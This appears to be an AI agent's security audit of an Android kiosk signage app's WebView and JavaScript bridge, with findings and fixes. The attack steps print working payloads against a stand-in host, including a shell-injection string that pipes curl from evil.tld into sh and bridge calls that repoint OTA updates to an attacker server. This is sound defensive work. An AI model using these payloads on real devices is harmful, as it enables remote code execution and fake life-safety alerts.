> **Provenance:** produced by a single Opus agent under the audit ground rules (read-only,
> evidence-with-file:line, two-methods-for-absence-claims, self-refutation before reporting).
> **Lead review status: NOT yet independently re-verified.**
> Dispatched to answer the open question left by 01-REALTIME-BUS.md finding R-01.

I have everything I need. Here is the report.

# Android WebView + JS Bridge Security Audit — 2026-08-01

Scope: `apps/player/` (the Android kiosk shell APK), read in full — `MainActivity.kt` (1864 lines), `WebAppBridge.kt` (304), `SafePlayerWebViewClient.kt` (176), `serial/SerialPortBridge.kt` (367), `SpatialNavigation.kt` (271), `AndroidManifest.xml`, `network_security_config.xml`, `file_paths.xml`, `BootReceiver.kt`, `usb/UsbAttachReceiver.kt`, `usb/UsbIngestActivity.kt`, `ota/OtaInstallReceiver.kt`, `ota/OtaUpdateWorker.kt`, `logging/PlayerLogger.kt`, `app/build.gradle.kts`. Plus the web surfaces that feed the bridge (`apps/web/src/app/player/page.tsx`, `apps/web/src/components/widgets/WidgetRenderer.tsx`).

---

## VERDICT ON THE `?api=` QUESTION

**Short answer: the Android shell does NOT make `?api=` reachable from outside the WebView — there is no intent path into the URL. But it does NOT neutralize the finding either, and on Android the *consequence* of the same missing-allowlist class is far worse than in a browser, because the identical control exists natively as an unauthenticated JS-bridge method (`setBootstrap`) that repoints the OTA APK download.**

### (a) What URL does MainActivity load?

`MainActivity.loadPlayer()` — **`MainActivity.kt:1389-1451`** — is the only thing that ever loads the bridged WebView:

```kotlin
private fun loadPlayer(token: String) {
    val base = BuildConfig.PLAYER_BASE_URL.trimEnd('/')
    ...
    val builder = Uri.parse(base).buildUpon()
        .appendQueryParameter("client", "android")
        .appendQueryParameter("v", BuildConfig.VERSION_NAME)
        .appendQueryParameter("vc", BuildConfig.VERSION_CODE.toString())
        .appendQueryParameter("w", wPx.toString())
        .appendQueryParameter("h", hPx.toString())
        .appendQueryParameter("dpr", density.toString())
    builder.appendQueryParameter("mv", managerVersion ?: "")
    if (androidId.isNotBlank()) builder.appendQueryParameter("fp", "android-$androidId")
    if (token.isNotBlank()) builder.appendQueryParameter("token", token)
    val url = builder.build().toString()
    ...
    webView.loadUrl(url)                                    // line 1451
}
```

`BuildConfig.PLAYER_BASE_URL` is a **compile-time constant** — `app/build.gradle.kts:69-73`:

```kotlin
val playerBaseUrl: String = (project.findProperty("playerBaseUrl") as? String)
    ?: System.getenv("PLAYER_BASE_URL")
    ?: "https://venue-os.app/player"
buildConfigField("String", "PLAYER_BASE_URL", "\"$playerBaseUrl\"")
```

Every query parameter is derived locally (display metrics, `Settings.Secure.ANDROID_ID`, PackageManager, DataStore token). **`api` is never among them.** There is no `loadDataWithBaseURL` / `loadData` anywhere in the module.

Every `loadUrl` call site (grep across the module, `--exclude-dir=build`):

| Line | Call | Source of the string |
|---|---|---|
| `MainActivity.kt:1344` | `urlOverlayView.loadUrl(cleanUrl)` | JS bridge `showUrlOverlay(url)` — **separate WebView, no bridge attached** |
| `MainActivity.kt:1376` | `urlOverlayView.loadUrl("about:blank")` | constant |
| `MainActivity.kt:1451` | `webView.loadUrl(url)` | `BuildConfig.PLAYER_BASE_URL` + local params |
| `MainActivity.kt:1489` | `webView.loadUrl("about:blank")` | constant |
| `MainActivity.kt:1583` | `urlOverlayView.loadUrl("about:blank")` | constant |

### (b) Can attacker-controlled input reach that URL string? **No.**

Verified two independent ways: (1) full read of all 1864 lines of `MainActivity.kt`; (2) targeted grep for every intent-read idiom (`getIntent`, `intent.`, `Extra(`, `.data`) plus every `loadUrl`/`loadData*` call in the module.

MainActivity reads exactly **two** things out of an Intent:

1. **`MainActivity.kt:582-599`** — `handleInstallPromptTrampoline()`, called from `onCreate` (line 256) and `onNewIntent` (line 579):
```kotlin
if (launchIntent?.action != OtaInstallReceiver.ACTION_LAUNCH_INSTALL_PROMPT) return
val prompt: Intent? = launchIntent.getParcelableExtra(OtaInstallReceiver.EXTRA_INSTALL_PROMPT)
...
prompt.flags = Intent.FLAG_ACTIVITY_NEW_TASK
startActivity(prompt)
```
This is a `Parcelable` **Intent**, passed to `startActivity` — never to `loadUrl`, never to a preference, never into a query param. (It is its own bug — see **AND-006**.)

2. **`MainActivity.kt:1621`** — `intent.data?.schemeSpecificPart` inside `managerInstallReceiver`, a runtime `BroadcastReceiver` for `ACTION_PACKAGE_ADDED` (a system-protected broadcast); the value is compared against two hardcoded package names and otherwise discarded.

`getIntent().data` is **never** read. The `OPEN_PLAYER` and `LEGACY_PAIR` intent-filters (`AndroidManifest.xml:158-161`, `183-186`) carry **no `<data>` element** and no extra is consumed. So:

```
adb shell am start -a com.educms.player.OPEN_PLAYER --es api https://evil.tld
adb shell am start -a com.educms.player.OPEN_PLAYER -d "https://venue-os.app/player?api=https://evil.tld"
```
**both do nothing** beyond bringing the (singleTask) activity forward, which reloads the same hardcoded URL.

### (c) Does the shell strip/reject query params?

It doesn't strip — it *constructs* the query itself, and `PLAYER_BASE_URL` has no query string, so `api=` is never present on the shell-issued load. But the shell also provides **no rejection**:

`SafePlayerWebViewClient.kt:105-113` is a **host-only** allowlist:

```kotlin
override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
    val host = request.url.host ?: return true
    val allow = allowedHost != null && (host == allowedHost || host.endsWith(".$allowedHost"))
    if (!allow) { Log.w("PlayerWeb", "Blocked navigation to $host") }
    return !allow
}
```

`https://venue-os.app/player?api=https://evil.tld` is host-`venue-os.app` → **allowed**. Path and query are never examined. (Credit where due: the suffix check is written correctly — `host.endsWith(".$allowedHost")` with the leading dot — so `venue-os.app.attacker.net` and `evil-venue-os.app` are both correctly rejected. This is *not* the naive `contains`/`startsWith` bug.)

### The three ways the shell makes it *worse*, not better

1. **The shell cannot heal a poisoned value.** `getApiRoot()` (`apps/web/src/app/player/page.tsx:597-612`) writes the param to `localStorage['edu_api_root']` and, on every subsequent load, reads localStorage when no `?api=` is present. `loadPlayer()` never sends `?api=`, and nothing in the shell clears WebView storage (`unpairAndRestart()` at `MainActivity.kt:1479-1494` clears only the native DataStore). **One successful poisoning is permanent across reboots, OTAs, and force-reloads.**

2. **The same control exists natively, with no allowlist at all, callable from JS.** `apps/web/src/app/player/page.tsx:2414-2430` calls `bridge.setBootstrap(getApiRoot(), fp)` on every page load — i.e. the `?api=` value is copied straight into the **native** `api_root` SharedPreference (`MainActivity.kt:1069-1107`). And any JS can call `EduCmsNative.setBootstrap(anything, anything)` directly, bypassing `?api=` entirely; the only validation is non-empty (`MainActivity.kt:1084`).

3. **That native `api_root` drives the OTA APK download.** See **AND-001** — this converts "fake lockdown injection" into "silent installation of an attacker-signed APK on every screen."

**Verdict: `?api=` is *unchanged* in reachability by the Android shell (no new remote entry point), but the shell escalates its impact from web-content compromise to persistent native code execution, and makes the poisoning permanent. It should be re-rated CRITICAL for the APK fleet, not de-rated.**

---

## Posture: **CRITICAL_GAPS**

Rationale. The defensive intent is visible and several controls are genuinely well built (system-only trust anchors, `allowFileAccess=false`, `MIXED_CONTENT_NEVER_ALLOW`, a correctly-written host-suffix check, `onPermissionRequest.deny()`, emergency remote-input lockout). But the load-bearing assumption written into the code — *"the `@JavascriptInterface` is only exposed to our trusted player web origin"* (`SerialPortBridge.kt:135-136`) — **is false as designed**: the same WebView that holds the bridge is the one that mounts operator-authored and third-party HTML in iframes, `removeJavascriptInterface` is never called, and no bridge method performs an origin check. Behind that assumption sit three methods that individually reach arbitrary shell execution (`ctsSerialConnect`) and arbitrary APK installation (`setBootstrap` + `checkForUpdates`) — on a device whose signing key is public. Separately, a student with a $10 USB keyboard can de-provision a hallway screen from the emergency channel in about four keystrokes, with no PIN anywhere in the flow.

---

## Findings

### [CRITICAL] AND-001 — `setBootstrap()` + `checkForUpdates()` = attacker-chosen OTA server → silent install of an attacker-signed APK

**Attacker:** anyone who can execute JavaScript in any frame of the main player WebView. Concretely: (i) a CONTRIBUTOR/SCHOOL_ADMIN who can point a WEBPAGE widget or an EXTERNAL_HTML/AI-authored board at content they control; (ii) anyone who has poisoned `edu_api_root` (the `?api=` finding); (iii) anyone with a main-frame XSS; (iv) anyone with ADB (already game-over, but this makes it *persistent*).

**File:line:** `WebAppBridge.kt:166-173`, `WebAppBridge.kt:107-111`, `MainActivity.kt:1069-1107`, `ota/OtaUpdateWorker.kt:118-134, 189-263, 415-479`, `app/build.gradle.kts:119-126`.

**Evidence:**

```kotlin
// WebAppBridge.kt:166-173 — no scheme check, no host allowlist, no auth
@JavascriptInterface
fun setBootstrap(apiRoot: String, fingerprint: String) {
    try { onSetBootstrap(apiRoot, fingerprint) } catch (ex: Exception) { ... }
}
```
```kotlin
// MainActivity.kt:1080-1099 — only validation is "not empty"
val cleanApiRoot = apiRoot.trim().removeSuffix("/").removeSuffix("/api/v1")
val cleanFp = fingerprint.trim()
if (cleanApiRoot.isEmpty() || cleanFp.isEmpty()) { ...reject... } else {
    prefs.edit().putString("api_root", cleanApiRoot).putString("device_fingerprint", cleanFp).apply()
}
```
```kotlin
// OtaUpdateWorker.kt:118, 155, 189, 208 — api_root chooses the update server AND the APK
val apiRoot = ...getString("api_root", null) ?: return@withContext Result.success()
val url = URL("$apiRoot/api/v1/player/update-check")
...
val apkUrl = latest.optString("apkUrl")
val dlConn = (URL(apkUrl).openConnection() as HttpURLConnection)
```
```kotlin
// OtaUpdateWorker.kt:198, 248-251 — the integrity hash comes from the SAME server
val expectedSha = latest.optString("sha256")
if (expectedSha.isNotEmpty()) { ... if (!actual.equals(expectedSha, ignoreCase = true)) { discard } }
```
```kotlin
// build.gradle.kts:119-126 — the signing key is in the public repo
signingConfigs { getByName("debug") {
    storeFile = file("debug.keystore"); storePassword = "android"
    keyAlias = "androiddebugkey"; keyPassword = "android" } }
```
```kotlin
// WebAppBridge.kt:107-111 — and JS can fire the OTA immediately, no 6h wait
@JavascriptInterface
fun checkForUpdates(): String { onCheckForUpdates(); return BuildConfig.VERSION_NAME }
```

**Attack:**
1. Attacker gets JS running in any frame of the player WebView (see AND-002 for the routes).
2. `window.EduCmsNative.setBootstrap("https://evil.tld", window.EduCmsNative.deviceInfo() && fp)` — the native `api_root` pref is now the attacker's server. (`fingerprint` can be any non-empty string; the worker falls back to `"unknown"` if absent.)
3. `window.EduCmsNative.checkForUpdates()` — fires `OtaUpdateWorker` immediately.
4. Worker POSTs `https://evil.tld/api/v1/player/update-check`. Attacker replies `{"latest":{"versionCode":99999,"apkUrl":"https://evil.tld/p.apk","sha256":"<hash of p.apk>","forced":true}}`.
5. SHA-256 "verification" passes — the attacker supplied both the file and the hash. (Or omit `sha256` entirely: line 248 skips verification when empty.)
6. `triggerInstall()` opens a `PackageInstaller.Session` with `params.setAppPackageName(ctx.packageName)`. The attacker's APK declares `package="com.educms.player.debug"` and is **signed with `apps/player/app/debug.keystore`, which is committed to the public repo** — so Android's same-signature upgrade check passes.
7. On any device where Player has previously self-installed once, Player **is installer-of-record** and holds `UPDATE_PACKAGES_WITHOUT_USER_ACTION` (`AndroidManifest.xml:50`) with `USER_ACTION_NOT_REQUIRED` set (`OtaUpdateWorker.kt:441-448`) → **install is silent, zero taps, nobody in the hallway sees anything.**
8. Attacker code now runs with `REQUEST_INSTALL_PACKAGES`, `RECEIVE_BOOT_COMPLETED` (auto-restart), a foreground service, USB-host access, and — on Device-Owner-provisioned kiosks — as the HOME launcher.

**Impact:** Persistent, reboot-surviving, OTA-surviving remote code execution on the physical device, in a hallway of a K-12 school. The compromised APK owns the emergency display channel absolutely: it can render a fake lockdown, suppress a real one, and it survives every remote remediation the dashboard has. Because `api_root` is set from a value the *server* controls (the manifest → `?api=` → localStorage → `setBootstrap`), one compromised or spoofed API host converts to **fleet-wide** takeover.

**Fix (in priority order):**
1. Validate `apiRoot` in `onSetBootstrap` against a compile-time allowlist (`BuildConfig.PLAYER_BASE_URL` host + explicit API host), require `https://`, and reject anything else — this is a 5-line change at `MainActivity.kt:1080`.
2. Pin the OTA *source*: hardcode the update-check host in `OtaUpdateWorker` rather than reading it from a JS-writable pref; require `apkUrl` to be on that host.
3. Verify the APK signature yourself before `session.commit()` (`PackageManager.getPackageArchiveInfo` + compare signing cert to your own) instead of relying on Android's same-key rule while the key is public.
4. **Rotate the signing key and stop shipping `assembleDebug` to production** — the committed keystore makes step 6 free for anyone.
5. Move the whole bridge to `WebViewCompat.addWebMessageListener(webView, "EduCmsNative", allowedOriginRules, listener)` — `androidx.webkit:1.11.0` is already a dependency (`build.gradle.kts:210`) and that API exists specifically because `addJavascriptInterface` cannot be origin-scoped.

**Confidence:** High for the code path (every line quoted was read in context). High for the signing-key consequence (given as established context and confirmed by `build.gradle.kts:119-126` + `android:debuggable="true"` in the merged debug manifest, line 119). Medium-High for step 7 being silent in the field — it depends on Player having been installer-of-record at least once, which the code comments state is the intended steady state from v1.0.54 onward.

**Verification methods:** (1) full read of `WebAppBridge.kt`, `OtaUpdateWorker.kt`, and `MainActivity.kt`'s bridge-construction block; (2) grep for every `api_root` reader across the module — `OtaUpdateWorker.kt:118,301`, `OtaInstallReceiver.kt:102`, `HeartbeatService.kt:176`, `PlayerApp.kt:212-217`, `MainActivity.kt:918` — confirming a single JS-writable pref drives all native egress; (3) traced the web caller `apps/web/src/app/player/page.tsx:2414-2430` to confirm `getApiRoot()` feeds it.

---

### [CRITICAL] AND-002 — The JS bridge is attached to every frame of the WebView, and the player deliberately mounts untrusted HTML in frames of that WebView

**Attacker:** any tenant user who can author a template (CONTRIBUTOR and above), the AI Designer's output path, an imported board, or any party controlling a URL a WEBPAGE widget points at.

**File:line:** `MainActivity.kt:906-1223` (bridge attach), `WebAppBridge.kt:1-304` (entire file — no origin check in any method), `apps/web/src/components/widgets/WidgetRenderer.tsx:4100-4113` and `:4115-4130` (third-party iframes in the main WebView), `:3803-3815` + `srcdoc` path (EXTERNAL_HTML / AI-authored boards).

**Evidence:**

```kotlin
// MainActivity.kt:906, 1222 — attached once, to the main player WebView, forever
wv.addJavascriptInterface( WebAppBridge( ...18 methods... ), "EduCmsNative" )
```
No `removeJavascriptInterface` exists anywhere in the module. No bridge method inspects the calling frame's origin — I read all 304 lines of `WebAppBridge.kt`; the only input validation present is `showUrlOverlay`'s `http(s)` prefix test (`:183-187`) and `ctsSerialConnect`'s `/dev/tty` prefix test (`SerialPortBridge.kt:137`).

The code's stated assumption is explicit, and wrong:
```kotlin
// SerialPortBridge.kt:135-136
// Belt and suspenders since the @JavascriptInterface
// is only exposed to our trusted player web origin.
```
```kotlin
// WebAppBridge.kt:177-179
// This is only exposed to the trusted EduCMS player page; the overlay WebView
// does not receive this bridge.
```
The overlay claim is true. The "trusted page" claim is not, because the trusted page mounts untrusted frames:

```tsx
// WidgetRenderer.tsx:4100-4112 — WEBPAGE widget, direct mode: arbitrary URL, main WebView
if (directMode && rawUrl) {
  return (<div ...><iframe ref={iframeRef} src={rawUrl} ... /></div>);
}
```
```tsx
// WidgetRenderer.tsx:4060-4063 + 4115-4130 — WEBPAGE widget, proxy mode
return `${API_BASE}/api/v1/proxy/web?url=${encodeURIComponent(url)}&v=3${interactiveQs}`;
// ...rendered unsandboxed, with the upstream page's JS running:
//   "Interactive mode lets the page's own JS run inside the iframe"
//   "We still don't sandbox — sandbox=allow-scripts + null-origin would CORS-break…"
```
and the proxy strips the last framing defence server-side (`apps/api/src/proxy/proxy.controller.ts:599-601`): `res.removeHeader('X-Frame-Options'); res.removeHeader('Content-Security-Policy'); res.setHeader('Content-Security-Policy', "frame-ancestors *")`.

EXTERNAL_HTML boards (~107 files plus every AI-authored and imported board) run in `sandbox="allow-scripts"` null-origin frames — either `src=` a same-origin path or `srcdoc=` inline HTML (`WidgetRenderer.tsx:3803-3815`). Sandboxing removes same-origin access to the *parent document*; it does not remove the injected Java object, because `addJavascriptInterface` installs per `RenderFrame` with no origin or sandbox scoping. This is exactly why `WebViewCompat.addWebMessageListener(..., allowedOriginRules, ...)` was added to `androidx.webkit`.

**Attack:**
1. Attacker authors (or gets an operator to accept) a board or WEBPAGE widget whose content they control.
2. That content runs `window.EduCmsNative.setBootstrap('https://evil.tld','x'); window.EduCmsNative.checkForUpdates();` — chain into **AND-001**.
3. Or `window.EduCmsNative.ctsSerialConnect('/dev/tty; <shell>',9600,8,1,'even')` — chain into **AND-003**.
4. Or `window.EduCmsNative.showUrlOverlay('https://evil.tld/fake-lockdown')` — chain into **AND-005**.
5. Or `window.EduCmsNative.unpair()` — the screen drops off the emergency fleet.

**Impact:** Collapses the entire trust boundary. Every privilege in the bridge becomes available to whoever can put a byte of HTML on a screen — which, by design, includes low-privilege tenant roles and AI-generated content.

**Fix:** Replace `addJavascriptInterface` with `WebViewCompat.addWebMessageListener` scoped to `allowedOriginRules = setOf("https://venue-os.app")`. Until then: (a) call `removeJavascriptInterface("EduCmsNative")` before any navigation away from the player origin and re-add on `onPageStarted` for the allowed host only — note this does **not** help with iframes, so (b) is mandatory; (b) render *all* WEBPAGE/EXTERNAL_HTML content in the bridge-free `urlOverlayView`, or in a third bridge-free WebView, never in `binding.webview`.

**Confidence:** High that the code mounts untrusted frames in the bridged WebView (quoted above, read in context). High-Medium that those frames receive `EduCmsNative`: this is documented Android behaviour and the stated rationale for the `addWebMessageListener` API, but **I could not execute a device test in this read-only audit** — see "Not checked / UNVERIFIED". If a device test showed iframes do *not* receive the object, AND-001/003/005 drop to "requires main-frame XSS or ADB", i.e. HIGH rather than CRITICAL; they do not become non-issues.

**Verification methods:** (1) full read of `WebAppBridge.kt` (no origin checks) and `MainActivity.kt` (single attach, no removal); (2) grep across the whole module for `removeJavascriptInterface` / `addJavascriptInterface` — one hit, `MainActivity.kt:906`; (3) traced the web render paths for WEBPAGE and EXTERNAL_HTML to confirm they mount inside the player page, not the native overlay.

---

### [CRITICAL] AND-003 — Shell command injection in `ctsSerialConnect` → arbitrary command execution as the app UID from JavaScript

**Attacker:** same as AND-002 — any JS in any frame of the player WebView.

**File:line:** `serial/SerialPortBridge.kt:137-140` and `:299-313`; exposed at `WebAppBridge.kt:260-275`.

**Evidence:**

```kotlin
// SerialPortBridge.kt:137-140 — the ONLY validation on devicePath
if (!devicePath.startsWith("/dev/tty")) {
    lastError = "Invalid device path (must start with /dev/tty)"
    return jsonError("invalid_path", lastError!!)
}
```
```kotlin
// SerialPortBridge.kt:299-303 — string-interpolated into `sh -c`
private fun runStty(devicePath: String, flags: String): SttyResult {
    return try {
        val cmd = arrayOf("/system/bin/sh", "-c", "stty -F $devicePath $flags")
        val proc = Runtime.getRuntime().exec(cmd)
```
```kotlin
// WebAppBridge.kt:260-270 — reachable from JS, devicePath passed straight through
@JavascriptInterface
fun ctsSerialConnect(devicePath: String, baudRate: Int, dataBits: Int,
                     stopBits: Int, parity: String): String {
    val bridge = ctsSerial ?: return ...
    return try { bridge.connect(devicePath, baudRate, dataBits, stopBits, parity) } ...
}
```
The bridge is always constructed — `MainActivity.kt:1218-1220` passes a live `SerialPortBridge`, and `isAvailable()` returns `true` unconditionally (`SerialPortBridge.kt:112`). The other parameters are safe (`Int`s, and `parity` is mapped through a `when` to fixed literals at `:161-165`), but `devicePath` is not.

**Attack:**
1. Attacker JS calls:
   `EduCmsNative.ctsSerialConnect("/dev/tty; curl https://evil.tld/s | sh #", 9600, 8, 1, "even")`
2. The prefix check passes (`"/dev/tty; …".startsWith("/dev/tty")` is `true`).
3. `sh -c "stty -F /dev/tty; curl https://evil.tld/s | sh # cs8 parenb -parodd -cstopb raw -echo"` executes.
4. Attacker now has arbitrary shell as `u0_aXX` (the Player app UID): read/write the app sandbox (DataStore pairing token, SharedPreferences, the log directory), stage an APK into `getExternalFilesDir("updates")`, exfiltrate over the network (`INTERNET` is held), and establish persistence independent of the WebView.

**Impact:** Escalates "hostile web content can call 18 whitelisted methods" to "hostile web content runs arbitrary code inside the app sandbox". Combined with AND-001 it is redundant for takeover, but it is an independent path and it survives any fix to the OTA chain.

**Fix:** Do not shell out. Either (a) drop `Runtime.exec` and set termios via JNI, or (b) at minimum pass the path as an `execve` argv element to `stty` directly (`arrayOf("stty","-F",devicePath) + flags.split(" ")` — no `sh -c`), **and** validate with a strict regex (`^/dev/tty[A-Za-z0-9]{0,15}$`) rather than `startsWith`. Also gate `ctsSerial*` behind a build flavor so non-ECBox SKUs never ship it (the class's own comment at `:108-111` already contemplates this).

**Confidence:** High. The injection is a direct read of two adjacent code paths; no device behaviour is assumed. The only precondition is AND-002.

**Verification methods:** (1) full read of `SerialPortBridge.kt`; (2) traced construction from `MainActivity.kt:1218-1220` and exposure at `WebAppBridge.kt:248-303` to confirm the method is live in every build, not dead code.

---

### [HIGH] AND-004 — Unauthenticated physical unpair / kiosk exit: four keystrokes on a USB keyboard removes a screen from the emergency channel

**Attacker:** a student (or anyone) standing at a hallway screen with a USB keyboard, a signage remote, or a touchscreen.

**File:line:** `MainActivity.kt:1794-1843` (key routing), `MainActivity.kt:1549-1565` (lock task never engaged), `apps/web/src/app/player/page.tsx:6860` and `:7467` (Enter/Space opens the overlay), `:2941-2948` (Home/`i` opens it), `:6426-6467` (`handleUnpair`), `:6393-6403` (`handleExitApp`), `:8675-8680` (plain `onClick` buttons).

**Evidence:**

```kotlin
// MainActivity.kt:1815-1836 — D-pad, Enter, Tab, Space, digits and Back all
// pass through to the WebView by design (so remotes can drive the UI).
KeyEvent.KEYCODE_DPAD_UP, ... KeyEvent.KEYCODE_ENTER,
KeyEvent.KEYCODE_TAB, KeyEvent.KEYCODE_SPACE, ... -> super.onKeyDown(keyCode, event)
KeyEvent.KEYCODE_BACK, KeyEvent.KEYCODE_ESCAPE -> super.onKeyDown(keyCode, event)
```
```tsx
// player/page.tsx:6860 — no PIN, no hold, no confirm
if (!isInteractive && (e.key === 'Enter' || e.key === ' ')) { e.preventDefault(); setShowOverlay(s => !s); }
```
```tsx
// player/page.tsx:8675 — the overlay's Exit button
onClick={(e) => { e.stopPropagation(); handleExitApp(); }}   // → bridge.exitToDeviceHome()
// player/page.tsx:6460 — the Unpair path
if (bridge && typeof bridge.unpair === 'function') { bridge.unpair(); return; }
```
`startLockTask()` is **never called** — the only two occurrences of the string in the module are in the explanatory comment at `MainActivity.kt:1550,1560` documenting the decision not to. Grep across the module for `startLockTask` returns those two comment lines only. `KioskHomeAlias` ships `android:enabled="false"` (`AndroidManifest.xml:228`). `KEYCODE_HOME` is intercepted by the system before an app sees it, so the `else -> true` swallow at `MainActivity.kt:1841` cannot block it.

Grep for `PIN` / `confirm(` across `player/page.tsx` returns no gating on any of these actions.

**Attack:**
1. Plug a USB keyboard into the screen (or use the supplied signage remote, or tap if it's a touchscreen).
2. Press **Enter** → the info overlay opens.
3. **Tab/arrow** to "Unpair" (or "Exit to launcher") → **Enter**.
4. `bridge.unpair()` clears the native DataStore token and reloads to the pairing screen. The screen is now off the fleet: it will not receive a lockdown, evacuation, or weather alert until an admin physically re-pairs it.
5. Repeat down the corridor. Alternatively choose "Exit to launcher" → `exitToDeviceHome()` disables `KioskHomeAlias`, clears preferred activities, and explicitly launches the OEM launcher (`MainActivity.kt:954-1066`) — which on a Goodview/NovaStar box exposes network settings and the vendor CMS.

**Impact:** Silent, unauthenticated removal of screens from the life-safety alerting path, plus full kiosk escape to the OEM launcher. This is one step short of the CRITICAL anchor ("suppressed emergency alert"); I hold it at HIGH only because it is per-screen and requires physical proximity — but a walk down one hallway makes it building-wide.

**Existing partial defence (credit):** during an active emergency, remote input is locked out — `player/page.tsx:2896-2901` and `:2927-2935` return early on `activeEmergencyRef.current`, so Back/Escape/Home/`i` cannot cover a live lockdown with the Stop splash. That is a real and well-placed control. It does **not** mitigate this finding, because the attack is performed *before* the emergency, on an ordinary day.

**Fix:** PIN-gate `unpair` and `exitToDeviceHome` (a 4-6 digit code stored per-tenant, entered on the overlay) — or, minimally, require a 3-second hold plus a typed confirmation, matching the pattern already used for panic triggers. Enable lock-task / Device Owner pinning on provisioned kiosks. Consider requiring a server round-trip (an admin-approved unpair token) rather than a purely local action.

**Confidence:** High for the code paths. Medium for "USB keyboard Enter reaches the page" — `Activity.onKeyDown` only fires for keys the focused view didn't consume, and the WebView holds focus, so keys reach the DOM either way; but I could not test on hardware.

**Verification methods:** (1) read of `MainActivity.kt` key routing in full; (2) grep for `startLockTask` (2 comment-only hits) and for `PIN`/`confirm(` in the player page (no gating hits); (3) traced the overlay trigger → handler → bridge call chain in `page.tsx`.

---

### [HIGH] AND-005 — `showUrlOverlay` has no host allowlist: any frame can put arbitrary full-screen web content on a school hallway display

**Attacker:** any JS in the player WebView (AND-002), or anyone who controls the manifest (a poisoned `edu_api_root`, a rogue tenant user, a compromised API).

**File:line:** `WebAppBridge.kt:180-194`, `MainActivity.kt:1333-1369`, `MainActivity.kt:1304-1330`.

**Evidence:**

```kotlin
// WebAppBridge.kt:181-194 — scheme check only; ANY http(s) host is accepted
fun showUrlOverlay(url: String) {
    val cleanUrl = url.trim()
    if (!cleanUrl.startsWith("https://", ignoreCase = true) &&
        !cleanUrl.startsWith("http://", ignoreCase = true)) { ...reject... ; return }
    try { onShowUrlOverlay(cleanUrl) } catch ...
}
```
```kotlin
// MainActivity.kt:1304-1307 — the overlay WebView has NO navigation restriction at all
wv.webViewClient = object : WebViewClient() {
    override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
        return false
    }
```
The overlay is `bringToFront()`ed and given focus (`MainActivity.kt:1345-1352`), the recovery overlay is force-hidden behind it (`:1368`), and `SpatialNavigation.inject()` is run on it (`MainActivity.kt:1328`) so a remote can drive whatever site is showing.

**Attack:**
1. `EduCmsNative.showUrlOverlay("https://evil.tld/lockdown")` from any frame — or push a `text/html` URL asset into a playlist, which the player routes to this exact bridge method (`player/page.tsx:6297` region, `showUrlOverlay(url)`).
2. The attacker's page renders full-screen over the real player, on a screen students and staff read as authoritative.
3. Serve a pixel-accurate fake lockdown ("SHELTER IN PLACE — DO NOT EXIT"), a fake all-clear during a real incident, or a fake evacuation route directing people toward a hazard.
4. The page can then navigate anywhere (`shouldOverrideUrlLoading` returns `false` for everything) and persists until `hideUrlOverlay` is called.

**Impact:** Life-safety misinformation on a physical display, with the real player suppressed underneath. Single-screen at minimum; fleet-wide if reached via a poisoned `api_root` or a compromised API.

**Mitigating factors (real):** the overlay WebView does **not** receive the bridge (verified: `configureUrlOverlay` at `MainActivity.kt:1261-1331` contains no `addJavascriptInterface`), `allowFileAccess=false`, `allowContentAccess=false`, `onPermissionRequest.deny()`, `setSupportMultipleWindows(false)`, and because `shouldOverrideUrlLoading` returns `false` the WebView handles URLs itself rather than handing `intent://`/`market://` to the system — so there is no external-app-launch escape from the overlay.

**Fix:** Apply an allowlist to `showUrlOverlay` — at minimum reject `http://`, and require the URL to match a tenant-configured allowlist of permitted external hosts, enforced server-side on the manifest and re-checked natively. Consider a persistent, non-dismissable "External content" chrome band so a full-screen third-party page can never be mistaken for the emergency channel.

**Confidence:** High — every line quoted was read in context; no device behaviour assumed for the overlay itself. The "any frame can call it" precondition inherits AND-002's confidence.

**Verification methods:** (1) full read of `WebAppBridge.kt` and `configureUrlOverlay`/`showUrlOverlay` in `MainActivity.kt`; (2) grep confirming `addJavascriptInterface` appears exactly once in the module (`:906`, the main WebView) so the overlay is genuinely bridge-free.

---

### [MEDIUM] AND-006 — Intent redirection: exported MainActivity `startActivity`s an arbitrary caller-supplied Intent

**Attacker:** any malicious app co-installed on the device, holding zero permissions.

**File:line:** `MainActivity.kt:577-599`, `AndroidManifest.xml:109-111`, `ota/OtaInstallReceiver.kt:154-158`.

**Evidence:**

```kotlin
// MainActivity.kt:582-598
private fun handleInstallPromptTrampoline(launchIntent: Intent?) {
    if (launchIntent?.action != OtaInstallReceiver.ACTION_LAUNCH_INSTALL_PROMPT) return
    val prompt: Intent? = launchIntent.getParcelableExtra(OtaInstallReceiver.EXTRA_INSTALL_PROMPT)
    if (prompt == null) { ...; return }
    prompt.flags = Intent.FLAG_ACTIVITY_NEW_TASK
    try { startActivity(prompt) } ...
}
```
```kotlin
// OtaInstallReceiver.kt:156-157 — the trigger is a plain, guessable string
const val ACTION_LAUNCH_INSTALL_PROMPT = "com.educms.player.LAUNCH_INSTALL_PROMPT"
const val EXTRA_INSTALL_PROMPT = "install_prompt_intent"
```
```xml
<!-- AndroidManifest.xml:109-111 -->
<activity android:name=".MainActivity" android:exported="true" android:launchMode="singleTask"
```
`exported="true"` means an explicit component-targeted Intent reaches `MainActivity` regardless of the declared intent-filters. There is no caller check (`callingActivity`, `callingPackage`, or a signature-level permission) anywhere in the trampoline.

**Attack:**
1. Malicious app builds `Intent(ComponentName("com.educms.player.debug","com.educms.player.MainActivity")).setAction("com.educms.player.LAUNCH_INSTALL_PROMPT").putExtra("install_prompt_intent", <arbitrary Intent>)`.
2. `startActivity(...)`.
3. Player launches the nested Intent **as Player**, with `FLAG_ACTIVITY_NEW_TASK`. This grants the caller: launching Player's non-exported components (e.g. `usb.UsbIngestActivity`, `exported="false"` at `AndroidManifest.xml:302-307`), and — the classic escalation — laundering a `content://` URI + `FLAG_GRANT_READ_URI_PERMISSION` through Player's identity to reach its non-exported `FileProvider` (`AndroidManifest.xml:335-343`).

**Impact:** Bounded, which is why this is MEDIUM rather than HIGH: the FileProvider whitelist is exactly one directory (`file_paths.xml:10-12` — `getExternalFilesDir(null)/updates`, the OTA staging dir), so the URI-grant payoff is limited to reading/writing staged APKs rather than the pairing token or the DataStore. The precondition (a malicious app already installed on a signage box) is also hard. It is still a textbook CWE-926 and it removes a layer that the OTA chain in AND-001 relies on.

**Fix:** Do not accept a `Parcelable` Intent from an exported component. Either (a) mark the trampoline path with a `signature`-protection-level permission, (b) verify the nested Intent's component resolves to the system package installer before launching it, or (c) route the trampoline through a non-exported activity and have `OtaInstallReceiver` target that instead.

